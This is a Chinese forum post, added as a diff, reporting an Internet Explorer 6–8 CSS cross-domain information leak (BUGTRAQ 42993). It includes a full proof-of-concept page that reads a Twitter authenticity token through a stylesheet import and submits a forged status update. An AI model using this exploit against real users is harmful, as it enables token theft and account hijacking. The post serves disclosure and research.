@@ -1,0 +1,67 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Microsoft IE CSS处理跨域信息泄露漏洞
+D8888D主贴内容-------------------------------------------------------
+Microsoft IE CSS处理跨域信息泄露漏洞
+
+
+影响版本:
+Microsoft Internet Explorer 8.0
+Microsoft Internet Explorer 7.0
+Microsoft Internet Explorer 6.0漏洞描述:
+BUGTRAQ  ID: 42993
+
+Internet Explorer是Windows操作系统中默认捆绑的web浏览器。
+
+Internet Explorer允许包含跨来源的内容，且CSS解析器在处理内容时是容错的。如果用户在页面中注入某些内容并以样式表的方式导入，就可以获得其他域中网页的敏感信息。
+<*参考 
+[url=http://secunia.com/advisories/41271/]链接标记http://secunia.com/advisories/41271/[/url]
+[url=http://marc.info/?l=full-disclosure&m=128355357627660&q=p5]链接标记http://marc.info/?l=full-disclos ... 5357627660&q=p5[/url]
+*>
+测试方法:
+
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!
+<html>
+<head>
+<style>
+@import url("http://twitter.com/scarybeaststest");
+</style>
+<script>
+function loaded() {
+  var borrowed = document.body.currentStyle.fontFamily;
+  var i = borrowed.indexOf("authenticity_token = '");
+  if (i == -1) {
+    alert('Unable to locate authenticity token... fail will commence.');
+  } else {
+    document.getElementById('stuff').innerText = 'READY... press button to post to your twitter account.';
+  }
+  borrowed = borrowed.substring(i + 22);
+  i = borrowed.indexOf("'");
+  if (i == -1) {
+    alert('WTF?');
+  }
+  borrowed = borrowed.substring(0, i);
+  document.getElementById('here').value = borrowed;
+}
+</script>
+</head>
+<body onload="loaded()">
+<button onclick="document.getElementById('form').submit()">CLICK TO POST TO YOUR TWITTER ACCOUNT - THIS COULD BE AUTOMATED</button>
+<p>
+<form id ="form" action="http://twitter.com/status/update" method="POST">
+<input size="80" type="text" name="status" value="@scarybeasts would like the IE CSS bug fixed"/>
+<p>
+<input size="60" type="text" id="here" name="authenticity_token" value="value pending"/>
+</form>
+It will say READY here if it worked... then press the button with tweet text of your choice :)
+<div id="stuff"></div>
+</body>
+</html>
+厂商补丁：
+
+Microsoft
+---------
+目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：
+
+[url=http://www.microsoft.com/windows/ie/default.asp]链接标记http://www.microsoft.com/windows/ie/default.asp[/url]
